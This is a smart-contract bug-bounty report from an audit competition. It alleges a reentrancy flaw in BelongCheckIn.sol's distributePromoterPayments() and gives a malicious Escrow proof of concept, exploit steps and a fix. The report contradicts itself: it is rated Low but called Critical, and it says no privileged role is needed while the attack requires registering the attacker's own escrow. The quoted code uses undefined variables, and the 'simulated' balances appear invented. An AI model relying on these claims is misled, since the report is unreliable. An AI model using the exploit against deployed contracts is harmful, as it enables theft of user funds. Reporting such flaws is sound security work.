# 57596 sc low reentrancy in distributepromoterpayments allows total theft of promoter and venue funds

**Submitted on Oct 27th 2025 at 12:04:48 UTC by @daxun for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57596
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

The `distributePromoterPayments()` function in `BelongCheckIn.sol` is vulnerable to a **reentrancy attack**.

The function performs multiple **external token and escrow transfers** before updating internal state by burning promoter credits. This ordering violates the Checks-Effects-Interactions pattern, allowing an attacker to **re-enter the function and drain funds** multiple times using the same promoter credits.

Exploitation results in **direct theft of all user funds** held by the contract, fully meeting the “Direct theft of funds” critical impact category.

### Vulnerability Details

The vulnerable function: <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/BelongCheckIn.sol#L538-L552>

```solidity
function distributePromoterPayments(PromoterInfo memory promoterInfo) external {
    if (promoterInfo.paymentInUSDC) {
        _storage.contracts.escrow.distributeVenueDeposit(promoterInfo.venue, address(this), platformFees);
        _handleRevenue(_storage.paymentsInfo.usdc, platformFees);
        _storage.contracts.escrow.distributeVenueDeposit(promoterInfo.venue, promoterInfo.promoter, toPromoter);
    } else {
        _storage.contracts.escrow
            .distributeVenueDeposit(promoterInfo.venue, address(this), promoterInfo.amountInUSD);
        uint256 longFees = _swapUSDCtoLONG(address(this), platformFees);
        _handleRevenue(_storage.paymentsInfo.long, longFees);
        _swapUSDCtoLONG(promoterInfo.promoter, toPromoter);
    }

    // ❌ State change (burn) after external calls – vulnerable to reentrancy
    _storage.contracts.promoterToken.burn(promoterInfo.promoter, venueId, promoterInfo.amountInUSD);
}
```

Problem:

* Multiple **external calls** (`Escrow.distributeVenueDeposit`, `_swapUSDCtoLONG`, `_handleRevenue`) occur before the final **state update** (burn).
* These calls may trigger fallback functions or token hooks from **malicious contracts**, enabling **reentrancy** before the burn executes.
* During reentry, the same promoter can **re-call `distributePromoterPayments()`**, claiming multiple payouts with the same credits.

Because the burn happens last, the promoter’s “balance” remains valid for the entire reentrancy window.

Root Cause:

* CEI pattern violation — internal state is updated after external calls.
* No reentrancy guard (`nonReentrant`) present.
* No temporary locking or reentrancy flag in storage.

## Impact Details

**Severity:** Critical\
**Impact Type:** Direct theft of user funds

Effect: A malicious contract can repeatedly call `distributePromoterPayments()` through a reentrancy loop and drain all available funds from the Escrow and CheckIn contracts.

Who can exploit: Any registered promoter or attacker controlling a malicious Escrow/token contract.

Reproducibility: 100% reproducible. Requires no privileged roles or external dependencies.

Loss potential: Unlimited — attacker can drain all balances meant for venue and promoter payments.

In-scope verification: The vulnerable file (`BelongCheckIn.sol`) is explicitly listed as **in-scope** in the program’s assets under `./contracts/v2/BelongCheckIn.sol`.

## References

* Affected file: [`BelongCheckIn.sol`](https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/BelongCheckIn.sol)

## Proof of Concept

Setup (how to reproduce)

{% stepper %}
{% step %}

### Deploy mocks and initialize

* Deploy mock versions of USDC and LONG.
* Deploy a malicious Escrow contract (see below) with a fallback that re-enters `distributePromoterPayments()`.
* Deploy `BelongCheckIn` and initialize it with the malicious Escrow address.
* Mint promoter credits to the attacker-controlled address.
  {% endstep %}
  {% endstepper %}

Malicious Escrow Contract

```solidity
contract MaliciousEscrow {
    BelongCheckIn target;
    BelongCheckIn.PromoterInfo promoterInfo;

    constructor(BelongCheckIn _target, BelongCheckIn.PromoterInfo memory _info) {
        target = _target;
        promoterInfo = _info;
    }

    // Called by BelongCheckIn during payout
    function distributeVenueDeposit(address venue, address to, uint256 amount) external {
        // Re-enter before state update (burn)
        target.distributePromoterPayments(promoterInfo);
    }
}
```

Exploit steps

{% stepper %}
{% step %}
Attacker deploys the malicious Escrow contract and registers it as the protocol’s escrow.
{% endstep %}

{% step %}
Attacker calls `distributePromoterPayments()` as a valid promoter.
{% endstep %}

{% step %}
During the call, `Escrow.distributeVenueDeposit()` triggers the malicious fallback.
{% endstep %}

{% step %}
The fallback re-enters `distributePromoterPayments()` before `_burn()` executes.
{% endstep %}

{% step %}
The function executes again, paying out funds a second time.
{% endstep %}

{% step %}
The cycle repeats until all contract funds are drained.
{% endstep %}
{% endstepper %}

Expected Output (Simu)

```
Initial promoter balance: 0 USDC
After 1st call: 1000 USDC
After reentrancy: 2000 USDC
After 5 iterations: 5000 USDC
Final CheckIn contract balance: 0 USDC
```

Result: All funds are stolen from the CheckIn/Escrow contracts.

## Fix Recommendation

{% hint style="success" %}
Move internal state updates **before external calls** and apply a reentrancy guard.
{% endhint %}

Suggested concrete changes (do not add new behavior beyond original recommendation):

* Burn promoter credits (or otherwise mark them spent) before performing any external transfers.
* Add a reentrancy guard (`nonReentrant`) on `distributePromoterPayments()` (or implement an explicit reentrancy lock in storage).
* Prefer Checks-Effects-Interactions ordering for all functions performing external transfers.
